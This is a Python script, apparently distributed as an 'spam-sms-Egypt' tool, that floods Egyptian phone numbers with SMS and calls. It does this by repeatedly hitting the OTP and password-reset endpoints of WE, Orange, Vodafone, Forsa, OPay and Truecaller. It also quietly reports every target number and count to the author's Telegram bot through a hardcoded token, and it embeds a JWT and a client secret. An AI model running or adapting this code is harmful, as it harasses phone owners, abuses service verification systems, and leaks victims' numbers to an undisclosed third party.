import webbrowser
import os,sys,time
import random
import hashlib
os.system("clear")
os.system('git pull')
os.system("clear")
try:
	import requests
	import pyfiglet
	from bs4 import BeautifulSoup
except:
	os.system("pip install --upgrade pip")
	os.system("pip install requests")
	os.system("pip install pyfiglet")
	os.system("pip install bs4")
	os.system("clear")
	os.system('python spam-sms-Egypt.py')
	
token="5848610949:AAGG_fJJY5fcwWxHNDfFBlMuUv0Bnqi5aEw"

Id="1325332071"

password=input('Password:')
#ادخل باص 
if password=='2000':
	print("Welcome sir zomara")

else:
	print("Error password")
	webbrowser.open('https://api.whatsapp.com/send?phone=201274246999')
	
	sys.exit()



#color
R ='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
M='\033[1;35m'
P='\033[1;36m'
W='\033[1;37m'
X='\033[1;38m'
A='\033[1;39m'





global s
global n
global j

j=("+")
n = ('\n')
s = requests.session()


print(R+pyfiglet.figlet_format("spam sms by "))
print(pyfiglet.figlet_format("#~>   zomara() "))

code =""" 
-------------------------------------------------------------------------
- Code BY : Abohayah hack
-------------------------------------------------------------------------
      هتكتب اي رقم في ال id telegram 
      
      مثال 49467
      وانتر وابدا الاسبام 
"""

print(W+code)


#######==============################
def sub():
	try:
		id_user=int(input(P+'[+]Enter id Telegram:\033[1;37m'))

		url = f"https://api.telegram.org/bot{token}/getchatmember?chat_id=@Oppsl&user_id={id_user}"
		req = requests.get(url).text

#print(req)

		if 'member' in req:
			print(n+G+'[+]welcome sir and enjoy'+n)
			pass
		elif 'left' in req:
			print(n+R+'[-]Please subscribe first to the Telegram channel'+n)
			time.sleep(2)
			webbrowser.open('https://t.me/Hitler')
			sys.exit()
	
	except Exception as e:
		print(n+R+'[-]Please Enter id Telegram'+n)
		#sys.exit()
		sub()
sub()
#######==============################




def we():
	try:
		number=input(n+P+"[+]Enter Number:\033[1;37m")
		count=int(input(n+P+"[+]Enter Count:\033[1;37m"))
		print(n)
		req2 =requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count}  we")
		#print(req2.text)
		
		url="https://api-my.te.eg/api/user/mobile/resetpassword/initiate"
		headers ={'Host': 'api-my.te.eg',
'Connection': 'keep-alive',
'Content-Length': '59',
'Accept': 'application/json, text/plain, */*',
'Jwt':'eyJraWQiOiIxIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJ0ZS5jb20iLCJleHAiOjI1ODk5MDkxOTQsImp0aSI6IkViTllXQlAxWG9hcTNtaEt4NmVjcHciLCJpYXQiOjE2NDM4MjkxOTQsIm5iZiI6MTY0MzgyOTA3NCwic3ViIjoiQW5vbnltb3VzIiwicm9sZXMiOlsiUk9MRV9BTk9OWU1PVVMiXSwiSVAiOiIxMDIuMTg1LjExMy4xOTMsIDEwLjE2LjE0Ni41OCwgMTAuMTkuMjQ3LjI0MSIsImNoYW5uZWxJZCI6IldFQl9BUFAifQ.a8grOVPetI1jGvCfVLmsrVYI5Dp5_lFXhq-CMdOvsBESV3QH5S0Iw_RVSVFIfxXtGCkUcfmF_aaJIjlrL3WdZzqm0IQUgdXYUACFywwEj-LlVv4lW294U4v4O3IQCXkXNhff8DtjF128AvV4YY34RArz__Y4zPR4q6bfabE-XBexyfK3mWNuf20r7aRJoDIjk--c_aMZpj0vB9mTa91VbBxBbmlSst_lzi-d8yBGvw6c37GhmQZ-ybA2wAOsrS4uUeGEyS2IDTewnL3Qm9l5X5SXW9ekhNmiamJbsOFrWCrTgnm2yzNx_pFQBkdY0eJwUhuBayg9L5SDKC4krplenQ',
'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2040 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36',
'Content-Type': 'application/json',
'Origin': 'https://my.te.eg',
'X-Requested-With': 'mark.via.gp',
'Sec-Fetch-Site': 'same-site',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Dest': 'empty',
'Referer': 'https://my.te.eg/',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7'}
		data ={
  "header": {
    "msisdn":number,
    "locale": "en"
  },
  "body": {}}

  
		zz=0
		for i in range(0,count):
			try:
				req=requests.post(url,headers=headers,json=data).text
				#print(req)
				if "The verification code has been sent" in req:
					try:
						zz+=1
						print(G+f"[+]Done Send ✅ {[zz]} spam sms")
					except Exception as e:
						print(R+e)
				elif 'Service number or password is incorrect' in req:
					print(R+f'[-]Error Number [ {number} ] ,Not in we Try Again')
					we()
					
				else:
					print(R+'[-]Error Try Again')
					we()
					
			except Exception as g:
				print(R+"[-]Failed connect to internet")
				pass
				
	except Exception as r:
		print(R+n+"[-]Error Number or count Try again ")
		we()


#######==============################

#######==============################


def orange():
	try:
		number=input(n+P+"[+]Enter Number:\033[1;37m")
		count=int(input(n+P+"[+]Enter Count:\033[1;37m"))
		print(n)
		req2 =requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count}  orange")
		url = 'http://oleorange.com/login'
		head={'User-Agent':'Mozilla/5.0 (Linux; Android 10; RMX2040) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36'}
		req =requests.get(url,headers=head)
		re = req.cookies
		coooki = re['ASP.NET_SessionId']
		soup = BeautifulSoup(req.content, "html.parser")
		crumb = soup.find_all('input',{'name':'__VIEWSTATE'})[0].get('value')
		acrumb = soup.find_all('input',{'name':'__EVENTVALIDATION'})[0].get('value')
				
		headers ={'Host': 'oleorange.com',
'Connection': 'keep-alive',
'Content-Length': '443',
'Cache-Control': 'max-age=0',
'Upgrade-Insecure-Requests': '1',
'DNT':'1',
'Origin': 'http://oleorange.com',
'Content-Type': 'application/x-www-form-urlencoded',
'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2040 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Referer': 'http://oleorange.com/login',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en',
'Cookie':f'ASP.NET_SessionId={coooki}'}
		data ={'__LASTFOCUS':'',
'__EVENTTARGET':'',
'__EVENTARGUMENT':'',
'__VIEWSTATE':f'{crumb}',
'__VIEWSTATEGENERATOR':'C2EE9ABB',
'__EVENTVALIDATION':f'{acrumb}',
'txtPhone':number,
'btnLogin':'الدخول'}

		zz=0
		for i in range(0,count):
			try:
				req=requests.post(url,headers=headers,json=data).text
				#print(req)
				if "login" in req:
					try:
						zz+=1
						print(G+f"[+]Done Send ✅ {[zz]} spam sms")
					except Exception as e:
						print(R+e)
					
				else:
					print(R+'[-]Error Try Again')
					orange()
					
			except Exception as g:
				print(R+"[-]Failed connect to internet")
				pass
				
	except Exception as r:
		print(R+n+"[-]Error Number or count Try again ")
		orange()
		
		

#######==============################

#######==============################

def vodafone():
	try:
		number=input(n+P+"[+]Enter Number:\033[1;37m")
		count=int(input(n+P+"[+]Enter Count:\033[1;37m"))
		print(n)
		req2 =requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count} vodafone")
		url="https://gateway.mondiapay.com/mondiapay-vodafone-eg-v1/web/authorize/pin/send"
		headers = {
   'Host': 'gateway.mondiapay.com',
   'Connection': 'keep-alive',
   'Content-Length': '275',
   'Cache-Control': 'max-age=0',
   'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
   'sec-ch-ua-mobile': '?1',
   'sec-ch-ua-platform': '"Android"',
   'Origin': 'https://gateway.mondiapay.com',
   'Upgrade-Insecure-Requests': '1',
   'DNT': '1',
   'Content-Type': 'application/x-www-form-urlencoded',
   'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2040) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
   'Sec-Fetch-Site': 'same-origin',
   'Sec-Fetch-Mode': 'navigate',
   'Sec-Fetch-User': '?1',
   'Sec-Fetch-Dest': 'document',
   'Referer': 'https://gateway.mondiapay.com/mondiapay-vodafone-eg-v1/web/authorize?response_type=code&client_id=d86b9aa4-719f-4f33-aaf1-97f696194df2&redirect_uri=http%3A%2F%2Fvhub.vuclip.com%2Fapi%2Fng%2Fheresponse.php%3Fhtxnid%3D9887097&customerData=snjtT9QWtcJAOOTR3zirbdcLUhpExshWqjqrg%2BzDguwL7xhSDVmmMO1tm7IUzAkHaWxlVcwZra%2FoWh87kjQhUvvNVkG8f9H1RbF1pFLHQW%2FMPgHYVGVDqzlvzVLSaAeL',
   'Accept-Encoding': 'gzip, deflate, br',
   'Accept-Language': 'en,ar;q=0.9'}

		data ={'msisdn':number,
'clientId':'d86b9aa4-719f-4f33-aaf1-97f696194df2',
'redirectUrl':'http://vhub.vuclip.com/api/ng/heresponse.php?htxnid=9887097',
'metaData.cssUrl':'https://menad2c.mondiamedia.com/mpay/mondiapay-vodafone-eg/default/css/app.css',
'Login':'LOGIN'}

		zz=0
		for i in range(0,count):
			try:
				req=requests.post(url,headers=headers,data=data).text
				#print(req)
				if "تأكيد الرمز" in req:
					try:
						zz+=1
						print(G+f"[+]Done Send ✅ {[zz]} spam sms")
					except Exception as e:
						print(R+e)
				elif "رقم الهاتف غير صحيح" in req:
					print(R+f'[-]Error Number [ {number} ] , Try Again')
					vodafone()
					
				else:
					print(R+'[-]Error Try Again')
					vodafone()
					
			except Exception as g:
				print(R+"[-]Failed connect to internet")
				pass
				
	except Exception as r:
		print(R+n+"[-]Error Number or count Try again ")
		vodafone()


#######==============################

#######==============################


def All1():
	try:
		number=input(n+P+"[+]Enter Number:\033[1;37m")
		count=int(input(n+P+"[+]Enter Count:\033[1;37m"))
		print(n)
		req2 =requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count} All1")
		url="https://backend.forsaegypt.com/api/v1/accounts/verification/phone/"
		headers={'accept':'application/json',
'accept-language':'en',
'Content-Type':'application/json',
'Content-Length':'25',
'Host':'backend.forsaegypt.com',
'Connection':'Keep-Alive',
'Accept-Encoding':'gzip',
'User-Agent':'okhttp/4.9.2'}
		data={"phone":f"+2{number}"}
		zz=0
		for i in range(0,count):
			try:
				req=requests.post(url,headers=headers,json=data).text
				#print(req)
				if "sent" in req:
					try:
						zz+=1
						print(G+f"[+]Done Send ✅ {[zz]} spam sms")
					except Exception as e:
						print(R+e)
				elif "The phone number entered is not valid." in req:
					print(R+f'[-]Error Number [ {number} ] ,Try Again')
					All1()
					
				else:
					print(R+'[-]Error Try Again')
					All1()
					
			except Exception as g:
				print(R+"[-]Failed connect to internet")
				pass
				
	except Exception as r:
		print(R+n+"[-]Error Number or count Try again ")
		All1()
		

#######==============################

#######==============################
		

		
def All2():
	try:
		number=input(n+P+"[+]Enter Number:\033[1;37m")
		count=int(input(n+P+"[+]Enter Count:\033[1;37m"))
		print(n)
		req2 =requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->>{count}")
		url="https://offline-pos-gateway.opayeg.com/register/sendOTP/mobile"


		headers = {
   'Host':'offline-pos-gateway.opayeg.com',
   'source_name':'oms',
   'versioncode':'2097216',
   'nettype':'1',
   'token':'',
   'authorization':'',
   'locationinfo':'0.0,0.0',
   'location':'0.0,0.0',
   'app_id':'1672475213174-5017551600224729491',
   'device_id':'117172D5DBB012AC815770C581B29A0B',
   'pn':'team.opay.pos.egypt.mobileapp',
   'version_code':'2097216',
   'version_name':'2.0.4.115',
   'country':'',
   'network_ip':'',
   'trace_id':'e7512759-95e8-48a4-912c-3ba3397a5a3f',
   'model':'SM-J700H',
   'dma':'samsung',
   'brand':'samsung',
   'app':'9',
   'platform':'Android',
   'isvirtualdevice':'false',
   'mcc':'',
   'role':'',
   'paybill':'1',
   'blackbox':'',
   'uid':'',
   'campaign':'',
   'mediasource':'',
   'net_format':'wifi',
   'trans_id':'bdd5a75f9e3b437198e278d884e065a6',
   'request_tsp':'1672475278089',
   'clientsource':'apppos',
   'language':'en_US',
   'deviceid':'RISK#MERCHANT#117172D5DBB012AC815770C581B29A0B',
   'device':'samsung_SM-J700H',
   'content-type':'application/json; charset=UTF-8',
   'content-length':'24',
   'accept-encoding':'gzip',
   'user-agent':'okhttp/4.9.0'}

		data={"mobile":number}

		req=requests.post(url,headers=headers,json=data).text
		#print(req)
		zz=0
		for i in range(0,count):
			try:
				req=requests.post(url,headers=headers,data=data).text
				print(req)
				
				if "success" in req:
					try:
						zz+=1
						print(G+f"[+]Done Send ✅ {[zz]} spam sms")
					except Exception as e:
						print(R+e)
				elif "يرجى الاتصال بخدمة العملاء" in req:
					print(R+f'[-]Error Number [ {number} ] ,or website not support this number Try Again')
					All2()
					
				else:
					print(R+'[-]Error Try Again')
					All2()
					
			except Exception as g:
				print(R+"[-]Failed connect to internet")
				pass
				
	except Exception as r:
		print(R+n+"[-]Error Number or count Try again ")
		All2()
	  
	  



#######==============################


#######==============################


def call():
	try:
		number=input(n+P+"[+]Enter Number:\033[1;37m")
		req2 =requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={Id}&text={number}-->)call")
		asa = '123456789'
		gigk = str(''.join(random.choice(asa) for i in range(10)))
		md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
		url = "https://account-noneu.truecaller.com/v3/sendOnboardingOtp"
	
		headers = {'Host':'account-noneu.truecaller.com',
'content-type':'application/json; charset=UTF-8',
'content-length':'613',
'accept-encoding':'gzip',
'user-agent':'Truecaller/13.4.7 (Android;10)',
'clientsecret':'lvc22mp3l1sfv6ujg83rd17btt'}

		data={
  "countryCode": "eg",
  "dialingCode": 20,
  "installationDetails": {
    "app": {
      "buildVersion": 7,
      "majorVersion": 13,
      "minorVersion": 4,
      "store": "GOOGLE_PLAY"
    },
    "device": {
      "deviceId": md5,
      "language": "en",
      "manufacturer": "samsung",
      "mobileServices": [
        "GMS"
      ],
      "model": "SM-J700H",
      "osName": "Android",
      "osVersion": "10",
      "simSerials": [
        "8920022022832702574",
        "8920018520921472187"
      ]
    },
    "language": "en",
    "sims": [
      {
        "mcc": "602",
        "mnc": "2",
        "operator": "vodafone"
      },
      {
        "mcc": "602",
        "mnc": "1",
        "operator": "Orange EG"
      }
    ],
    "storeVersion": {
      "buildVersion": 7,
      "majorVersion": 13,
      "minorVersion": 4
    }
  },
  "phoneNumber": number,
  "region": "region-2",
  "sequenceNo": 1
}
		try:
			
			req6=requests.post(url,headers=headers,json=data).text
			#print(req6)
			if "Sent" in req6:
				print(G+n+"[+]Done send spam call")
				
			elif "Phone number limit reached" in req6:
				print(R+n+"[-]Error this number limit reached,Try Again After 24 hours")
				call()
			else:
				print(R+n+"[-]Error Try Again")
				call()
		except Exception as t:
			#print(R,t)
			print(R+n+"[-]Failed connect to internet")
			pass			
			
	except ValueError as v:
		#print(v)
		print(R+n+"[-]Error Number Try Again")
		call()
	except Exception as t:
			#print(R,t)
			print(R+n+"[-]Failed connect to internet")

#######==============################

print(n+R+"-This script work only with the Egyptian numbers\n")


#######==============################

def list():
	print(G+f"[1]{A}---> {R}spam sms{W} we")
	print(G+f"[2]{A}---> {R}spam sms {W}orange")
	print(G+f"[3]{A}---> {R}spam sms{W} vodafone")
	print(G+f"[4]{A}---> {R}spam sms{W} All Network")
	print(G+f"[5]{A}---> {R}spam sms{W} All Network +2")
	print(G+f"[6]{A}---> {R}spam call{W} All Network")
list()


#######==============################

choose = input(n+P+"[+]choose:\033[1;37m")

if choose =='1':
	we()

elif choose =='2':
	orange()
	
elif choose =='3':
	vodafone()

elif choose =='4':
	All1()

elif choose =='5':
	All2()
	
elif choose =='6':
	call()
	
else:
	print(R+n+"Error ,  choose from list"+n)
	time.sleep(1)
	os.system('python spam-sms-Egypt.py')